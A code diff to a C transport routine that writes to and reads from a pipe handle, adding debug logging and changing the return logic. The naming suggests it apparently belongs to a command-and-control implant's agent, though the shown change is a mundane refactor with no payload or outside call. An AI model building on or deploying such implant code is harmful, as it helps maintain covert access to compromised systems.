@@ -413,15 +413,20 @@ LEAVE:
     }
     else
     {
-        if ( ! Instance->Win32.WriteFile( Instance->Config.Transport.Handle, Data, Size, &Size, NULL ) )
-            return FALSE;
-        else
-        {
-            if ( RecvData )
-                *RecvData = TransportRecv( RecvSize );
-            return TRUE;
-        }
+        PUTS( "Trying to write & read from pipe" )
+        BOOL Success = FALSE;
 
+        Success = Instance->Win32.WriteFile( Instance->Config.Transport.Handle, Data, Size, &Size, NULL );
+
+#ifdef DEBUG
+        if ( ! Success )
+            PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );
+#endif
+
+        if ( RecvData )
+            *RecvData = TransportRecv( RecvSize );
+
+        return Success;
     }
 #endif
 }
@@ -456,6 +461,7 @@ PVOID TransportRecv( PSIZE_T Size )
             {
                 if ( Size )
                     *Size = BytesSize;
+
                 return Response;
             }
         }
